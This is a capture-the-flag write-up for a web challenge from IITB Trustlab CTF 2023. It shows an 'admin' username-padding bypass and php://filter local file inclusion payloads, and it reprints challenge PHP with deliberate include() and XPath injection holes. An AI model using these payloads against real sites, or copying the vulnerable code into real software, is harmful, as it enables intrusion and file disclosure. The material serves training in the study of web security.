---
title: EverythingEverywhere AllAtOnce
date: 2023-09-26 19:00:00 +530
categories: [writeups]
tags: [ctf, web,IITB Trustlab CTF 2023]
---

# 

## Description 

Do you think you can bypass all the security checks to reach all the way to top? Well my friend here "admin" can. When we asked him about it, he said... There is a chain of different vulnerabilities which will help you get to the top. Look out for every files and sources. Sources are biggest allies.
Flags are divided into 2 parts. Get both of them and concatenate them andwrap it in the form "iitbCTF{...}"

Link - https://iitbtrustlab-everythingishere.chals.io/


## Writeup

1. First register a new account and then login into account
2. On viewing the source of dashboard.php we can clearly see on putting ?src at the end of url we can view the php code
3. Now we go to admin.php and Trying the same technique for admin.php we can find our first bug

Admin.php

```html
<?php
session_start();

if (!isset($_SESSION["username"])) {
    header("Location: index.php");
    exit();
}

if(isset($_GET['src'])) {
    highlight_file(__FILE__);
}

// Strip any leading or trailing whitespace from the username
$username = trim($_SESSION["username"]);

if ($username !== "admin") {
    echo "You do not have access to this page.";
    exit();
}

// Check if the user has set a preferred theme
if (isset($_COOKIE["theme"])) {
    $theme = $_COOKIE["theme"];
} else {
    $theme = "light"; // Default theme
}

// Handle theme toggle
if (isset($_GET["theme"])) {
    if ($_GET["theme"] === "dark") {
        $theme = "dark";
        setcookie("theme", "dark", time() + 3600 * 24 * 30, "/");
    } else {
        $theme = "light";
        setcookie("theme", "light", time() + 3600 * 24 * 30, "/");
    }
}

$includedFile = isset($_GET["file"]) ? $_GET["file"] : "";

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/admin-style.css">
    <title>Admin Page</title>
</head>
<body class="<?php echo $theme; ?>">
    <div class="container">
        <div class="content">
            <h1>Welcome, Admin!</h1>
            <p>This is the admin page.</p>
            <div class="theme-toggle">
                <a href="?theme=<?php echo $theme === "light" ? "dark" : "light"; ?>">Change to <?php echo $theme === "light" ? ucfirst("dark") : ucfirst("light"); ?> Mode</a>
            </div>
            <form method="GET">
                <label for="file">Enter a filename to include:</label>
                <input type="text" id="file" name="file" placeholder="Enter filename">
                <button type="submit">Include File</button>
            </form>
            <!-- Refer todo.php: "EverythingIsThere" -->
            <!-- ?src for source code -->
            <?php
            if (!empty($includedFile)) {
                echo "<h2>Included File:</h2>";
                include($includedFile);
            }
            ?>
            </br><a href="logout.php">Log Out</a>
        </div>
    </div>
</body>
</html>

```

4. Here we can see anyuser with name admin and having arbitrary amount of space characters will be treated as admin
5. Now we register with the user "admin<any number of space> " and are able to login to admin.php and are able to look for include file vulnerability which can lead to LFI

6. On reading about this bug on internet I was able to find a <a href= "https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601">medium article</a>  which helped in exploiting this bug  

7. First payload which gave the source to "todo.php" and the first part of flag -```php://filter/convert.base64-encode/resource=todo.php``` this gives base64 encoded code we need to first decode it similar process happens for next payloads.

 Todo.php

 ```html
 <html>
<head>
    <title> TODOs </title>
</head>
<body>
<?php 
// Newer and more "LIGHTER" version of current application available at /dev  which does not use any SQL languages... - admin
// TODO: 
// 1). Change Reused Usernames and Passwords in /dev/login.php - john
// 2). Add proper input validations in search catalogue. - adam
// 3). Add feature to handle TODO Lists dynamically using db_connection.php - adam
echo "<p>No TODOs For You! TODOs for internal devs only!</p></br>";
// FLAG-1: iitbCTF{Ech0es_0fTh3
?>

<!-- I know it seems weird, but only who has access to codebase for this file can read TODOs, so I know it is pretty secure! -->
</body>
</html>
<?php
class DatabaseConnection {
    private $db;

    public function construct() {
        try {
            $dbFilePath = DIR . DIRECTORY_SEPARATOR . "data/EverythingIsHere.db";
            $this->db = new SQLite3($dbFilePath);
            if (!$this->db) {
                throw new Exception("Database connection error.");
            }
        } catch (Exception $e) {
            echo "Error: " . $e->getMessage();
        }
    }

    public function getConnection() {
        return $this->db;
    }

    public function closeConnection() {
        if ($this->db) {
            $this->db->close();
        }
    }

    public function destruct() {
        $this->closeConnection();
    }
}
?>
 
 ```
 8. Second payload 
 ```php://filter/convert.base64-encode/resource=dev/login.php``` 
 which gives us hint to refer dashboard.php

/dev/login.php

 ```html
 <?php
session_start();

if(isset($_SESSION["is_dev"]) && $_SESSION["is_dev"] === FALSE){
    session_destroy();
}

// Check if the user is already logged in
if (isset($_SESSION["username"])) {
    header("Location: dashboard.php");
    exit();
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Sanitize user input
    $sanitizedUsername = htmlspecialchars($username, ENT_QUOTES, 'UTF-8');
    $sanitizedPassword = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');

    $xmlDoc = new DOMDocument();
    $xmlDoc->load("data/users.xml");

    $xpath = new DOMXPath($xmlDoc);

    // SHA512 conversion of password
    $hashedPassword = hash("sha512",$sanitizedPassword);

    // Use prepared statement-like approach for safe query
    $query = "//user[username/text() = '$sanitizedUsername' and password/text() = '$hashedPassword']";

    $result = $xpath->query($query);

    if ($result->length === 1) {
        $_SESSION["username"] = $sanitizedUsername;
        $_SESSION["is_dev"] = TRUE;
        header("Location: dashboard.php");
        exit();
    } else {
        $loginError = "Invalid username or password.";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Login</title>
</head>
<body>
    <div class="container">
        <div class="form-container">
            <h2>Login</h2>
            <form action="login.php" method="POST">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" required><br>

                <label for="password">Password:</label>
                <input type="password" id="password" name="password" required><br>

                <button type="submit">Login</button>
                <?php if (isset($loginError)) { ?>
                    <p class="error-message"><?php echo $loginError; ?></p>
                <?php } ?>
            </form>
        </div>
    </div>
</body>
</html>

 ```

 9. Third payload to access /dev/dashboard.php - 
 ```php://filter/convert.base64-encode/resource=dev/dashboard.php``` which gives reference researchers.xml

 researchers.xml

 ```html
 <?php
session_start();

if(isset($_SESSION["is_dev"]) && $_SESSION["is_dev"] === FALSE){
    unset($_SESSION);
    header("Location: login.php");
    exit();
}

// Check if the user is logged in, otherwise redirect to the login page
if (!isset($_SESSION["username"])) {
    header("Location: login.php");
    exit();
}

// Logout functionality
if ($_SERVER["REQUEST_METHOD"] === "POST" && isset($_POST["logout"])) {
    session_destroy(); // Destroy the session
    header("Location: login.php"); // Redirect to login page
    exit();
}

// Search functionality
$searchResults = [];
if ($_SERVER["REQUEST_METHOD"] === "GET" && isset($_GET["search"])) {
    $searchName = $_GET["searchName"];
    $xmlDoc = new DOMDocument();
    $xmlDoc->load("data/researchers.xml");
    $xpath = new DOMXPath($xmlDoc);
    if($searchName !== ""){
        $query = "//researchers/researcher[contains(name, '$searchName')]";
        $searchResults = $xpath->query($query);
    } else {
        $query = "//researchers/researcher[contains(name, 'John Doe')]";
        $searchResults = $xpath->query($query);
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/dashboard-style.css">
    <title>Search Catalogue</title>
</head>
<body>
    <div class="container">
        <div class="dashboard-container">
            <h2>Welcome, <?php echo $_SESSION["username"]; ?></h2>
            <p><strong>Hall of Fame:</strong> John Doe, Emma Martinez</p>
            <h3>Search Cybersecurity Researchers</h3>
            <form action="dashboard.php" method="GET">
                <input type="text" name="searchName" placeholder="Enter researcher's name">
                <button type="submit" name="search">Search</button>
            </form>
            <?php
            if (!empty($searchResults)) {
                // echo $searchResults;
                echo "<h4>Search Results:</h4>";
                foreach ($searchResults as $result) {
                    $name = $result->getElementsByTagName("name")->item(0)->nodeValue;
                    $contributions = $result->getElementsByTagName("contributions")->item(0)->nodeValue;
                    $description = $result->getElementsByTagName("description")->item(0)->nodeValue;
                    $flag = $result->getElementsByTagName("flag")->item(0)->nodeValue;

                    echo "<div class='researcher'>
                              <h4>$name</h4>
                              <p><strong>Contributions:</strong> $contributions</p>
                              <p><strong>Description:</strong> $description</p>
                              <p><strong>Flag:</strong> $flag</p>
                          </div>";
                }
            }
            ?>
            <!-- enitites: researcher, flags -->
        </div>
        <form action="dashboard.php" method="POST">
                <button type="submit" name="logout">Logout</button>
        </form>
    </div>
</body>
</html>
 
 ```
 10. Final payload to access researchers.xml ```php://filter/convert.base64-encode/resource=dev/data/researchers.xml```

 ```xml
 <researchers>
    <researcher>
        <name>John Doe</name>
        <contributions>Web Application Security</contributions>
        <description>John Doe is a cybersecurity researcher with expertise in web application security.</description>
        <flag>None</flag>
    </researcher>
    <researcher>
        <name>Jane Smith</name>
        <contributions>Network Security</contributions>
        <description>Jane Smith is a cybersecurity expert specializing in network security and threat analysis.</description>
        <flag>None</flag>
    </researcher>
    <researcher>
        <name>Alexander Brown</name>
        <contributions>Malware Analysis</contributions>
        <description>Alexander Brown is known for his work in malware analysis and digital forensics.</description>
        <flag>None</flag>
    </researcher>
    <flag>None</flag>
    <researcher>
        <name>Emily Johnson</name>
        <contributions>Cryptography</contributions>
        <description>Emily Johnson is a cryptography enthusiast who has contributed to the field of secure communication.</description>
        <flag>None</flag>
    </researcher>
    <researcher>
        <name>William Davis</name>
        <contributions>Vulnerability Research</contributions>
        <description>William Davis has uncovered critical vulnerabilities in various software and systems.</description>
        <flag>None</flag>
    </researcher>
    <researcher>
        <name>Sophia Wilson</name>
        <contributions>IoT Security</contributions>
        <description>Sophia Wilson focuses on securing Internet of Things (IoT) devices and networks.</description>
        <flag>None</flag>
    </researcher>
    <researcher>
        <name>Michael Rodriguez</name>
        <contributions>Mobile Security</contributions>
        <description>Michael Rodriguez specializes in mobile security and mobile application vulnerabilities.</description>
        <flag>None</flag>
    </researcher>
    <researcher>
        <name>Olivia Green</name>
        <contributions>Ethical Hacking</contributions>
        <description>Olivia Green is an ethical hacker who helps organizations identify and fix security weaknesses.</description>
        <flag>None</flag>
    </researcher>
    <researcher>
        <name>David Lee</name>
        <contributions>Penetration Testing</contributions>
        <description>David Lee conducts thorough penetration tests to evaluate the security of systems and networks.</description>
        <flag>None</flag>
    </researcher>
    <researcher>
        <name>Emma Martinez</name>
        <contributions>Social Engineering</contributions>
        <description>Emma Martinez specializes in social engineering techniques and raising awareness about human-centric vulnerabilities.</description>
        <flag>None</flag>
    </researcher>
    <flags>
    <name>Flag-2</name>
    <contributions>Gives satisfaction of solving the challenge and points in CTF competition!</contributions>
    <description>The second part of the flag!</description>
    <flag>Future_4w41t_YOuR_D3st1ny}</flag>
    </flags>
</researchers> 
 
 ```

 And we get the flag... 

 ```
 iitbCTF{Ech0es_0f_Th3_Future_4w41t_YOuR_D3st1ny}
 ```

 P.S - We even won in the finals securing 2nd,3rd and 8th positions clinching a cashprize amounting to more than 100,000 INR.
